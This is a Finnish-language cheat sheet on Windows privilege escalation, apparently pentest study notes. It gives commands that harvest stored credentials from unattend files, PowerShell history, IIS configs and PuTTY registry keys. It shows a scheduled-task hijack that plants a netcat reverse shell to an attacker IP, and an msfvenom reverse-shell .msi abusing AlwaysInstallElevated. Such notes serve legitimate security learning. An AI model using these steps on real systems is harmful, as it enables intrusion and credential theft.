## Privilege Escalation: Windows ##

Windowsissa tavalliset käyttäjät kuuluvat Users -käyttäjäryhmään, administraattorit Administrators -käyttäjäryhmään.

Erityiskäyttäjätunnukset:

SYSTEM / LocalSystem: Käyttöjärjestelmän käyttämä tunnus käyttöjärjestelmän sisäisiin toimintoihin. Adminejakin korkeammat oikeudet.

Local Service: Oletuskäyttäjä "minimioikeuksilla" Windowsin palvelujen ajamiseen, anonyymit yhteydet verkon yli.

Network Service: Sama kuin yllä, mutta käyttää tietokoneen tunnuksia autentikoitumiseen verkon yli.

**Selkokielisten tunnusten etsimispaikkoja**

WDS:llä asennetut "Unattended Windows Installations" saattavat jättää admin-tunnuksia näihin sijainteihin:
```bash
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
Powershell-historia (cmd.exe ajettuna):
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Tallennetut käyttäjätunnukset:
```cmd
cmdkey /list
```
Jos löytyy kokeilemisen arvoisia, niin:
```cmd
runas /savecred /user:USERNAME cmd.exe
```
IIS konfiguraatioon tallennetut tunnukset:
```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
```cmd
type C:\inetpub\wwwroot\web.config | findstr connectionString
```
PuTTY:n tallentamat Proxy-tunnukset:
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
**Ajastetut tehtävät**

Listaa ajastetut tehtävät:
```cmd
schtasks
```
Lisätietoja yksittäisestä tehtävästä:
```cmd
schtasks /query /tn *TaskName* /fo list /v
```
Task to run kertoo ajettavan tiedoston (esim. .bat scripti), Task as user kertoo käyttäjätunnuksen, jolla tehtävä ajetaan. Alla olevalla komennolla tarkistetaan ko. tiedoston kirjoitusoikeudet, ja jos nykyisellä käyttäjällä voidaan kirjoittaa, niin voidaan muokata scriptiä, ja se pyörähtää Task as user-tunnuksella. 
```cmd
icacls C:\polku\tiedostoon\scripti.bat
```
Jos esim. \USERS -käyttäjillä kirjoitusoikeudet, voidaan tehdä reverse shell netcatilla:
```cmd
echo c:\polku\netcatiin\nc64.exe -e cmd.exe *Hyökkääjän IP* 9999 > C:\polku\scriptiin\scripti.bat
```
Netcat -kuuntelumoodiin omalle koneelle porttiin 9999:
```cmd
nc -lvp 9999
```
Seuraavan ajastuksen yhteydessä aukeaa shell "Task as user" -tunnuksella.

**AllwaysInstallElevated**

Windowsin asennustiedostot .msi käynnistyvät oletuksena käyttäjän oikeuksilla, mutta voidaan konfiguroida käynnistymään myös korkeammilla oikeuksilla. Jos **molemmat** alla olevat rekisteriarvot saadaan päälle onnistuneesti:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
niin voidaan luoda msfvenomilla .msi payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=*Hyökkääjän IP* LPORT=*Hyökkääjän portti* -f msi -o maltsu.msi
```
ja vastaavilla asetuksilla Metasploid Handler vastaanottamaan yhteys. Kun maltsu.msi on siirretty kohteelle, ajetaan ao. komento ja reverse shell pitäisi aueta:
```cmd
msiexec /quiet /qn /i C:\polku\kohteeseen\maltsu.msi
```
